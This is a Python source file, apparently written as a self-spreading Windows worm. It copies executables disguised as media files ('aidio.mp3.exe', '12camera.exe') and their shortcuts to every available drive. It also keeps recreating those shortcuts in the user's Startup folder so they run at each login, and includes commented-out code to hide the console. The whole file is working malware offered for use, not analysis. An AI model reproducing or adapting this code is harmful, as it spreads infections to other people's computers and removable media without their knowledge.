#coded by sachin BBSAD

import time
import os
#import ctypes
import getpass
from win32com.client import Dispatch
import threading
import base64
import time
#kernel32 = ctypes.windll.kernel32   # Access functions from kernel32.dll
#user32 = ctypes.windll.user32       # Access functions from user32.dll

#user32.ShowWindow(kernel32.GetConsoleWindow(), 0)   # Hide console



username = getpass.getuser()
start = 'Start Menu'


	


	
# encoding and decoding function

def encodes(filename,p):
	file0 = open(filename,"rb")
	file1 = file0.read()
	file0.close()
	
	x = base64.b64encode(file1)
	y = base64.b64decode(x)
	

	z = p+'\\'+filename
	file = open(z,"wb")
	file.write(y)
	file.close()

def monish():



#if file not exist in all drive below function will write files in all drives

 x = "DEFGHIJKMN"

#creates shortcuts


 while True:
  if not os.path.exists("aidio.mp3_short.lnk"):
	path1234 = os.path.join("aidio.mp3_short.lnk")
	target = r"C:\\songs\\aidio.mp3.exe"
	wDir = r"C:\\songs"
	iconn = r"C:\\songs\\aidio.mp3.exe"
 
	shell = Dispatch('WScript.Shell')
	shortcut = shell.CreateShortCut(path1234)
	shortcut.Targetpath = target
	shortcut.WorkingDirectory = wDir
	shortcut.IconLocation = iconn
	shortcut.save()

  if not os.path.exists("test_short.lnk"):
	path1235 = os.path.join("test_short.lnk")
	target = r"C:\\songs\\test.exe"
	wDir = r"C:\\songs"
	iconn = r"C:\\songs\\test.exe"
 
	shell = Dispatch('WScript.Shell')
	shortcut = shell.CreateShortCut(path1235)
	shortcut.Targetpath = target
	shortcut.WorkingDirectory = wDir
	shortcut.IconLocation = iconn
	shortcut.save()




  for word in x:
	word = word.rstrip()
	path = word + ":\\"
	if os.path.exists(path):
		y = path+"aidio.mp3.exe"
		sachin = "Windows"
		migore1 = path+"12camera.exe"
		migore2 = path+"aidio.mp3.exe"
		migore3 = path+"test.exe"
		if not os.path.exists(migore1):
			if os.path.exists(path+sachin):
				ajay = x.replace(word," ")
				x = ajay
			encodes('aidio.mp3.exe',path)
			encodes('aidio.mp3_short.lnk',path)
			encodes('12camera.exe',path)
			encodes('test.exe',path)
			encodes('test_short.lnk',path)

		elif not os.path.exists(migore2):
			if os.path.exists(path+sachin):
				ajay = x.replace(word," ")
				x = ajay
			encodes('aidio.mp3.exe',path)
			encodes('aidio.mp3_short.lnk',path)
			encodes('12camera.exe',path)
			encodes('test.exe',path)
			encodes('test_short.lnk',path)

		elif not os.path.exists(migore3):
			if os.path.exists(path+sachin):
				ajay = x.replace(word," ")
				x = ajay
			encodes('aidio.mp3.exe',path)
			encodes('aidio.mp3_short.lnk',path)
			encodes('12camera.exe',path)
			encodes('test.exe',path)
			encodes('test_short.lnk',path)
 
 

object1 = threading.Thread(target= monish)
object1.start()


path = "C:\\Users\\"+username+"\\AppData\\Roaming\\Microsoft\\Windows\\"+start+"\\Programs\\Startup"
position = os.getcwd()
while True:	
	fil1 = open('aidio.mp3_short.lnk','rb')
	fil2 = fil1.read()
	fil1.close()

	fil3 = open('test_short.lnk','rb')
	fil4 = fil3.read()
	fil3.close()

	sachin1 = base64.b64encode(fil2)
	sachin2 = base64.b64decode(sachin1)

	
	sachin3 = base64.b64encode(fil4)
	sachin4 = base64.b64decode(sachin3)
	os.chdir(path)
	
	if not os.path.exists('aidio.mp3_short.lnk'):
		file3 = open('aidio.mp3_short.lnk','wb')
		file3.write(sachin2)
		file3.close()
		
	
	elif not os.path.exists('test_short.lnk'):
		file4 = open('test_short.lnk','wb')
		file4.write(sachin4)
		file4.close()

	os.chdir(position)
	time.sleep(2)
		



















	
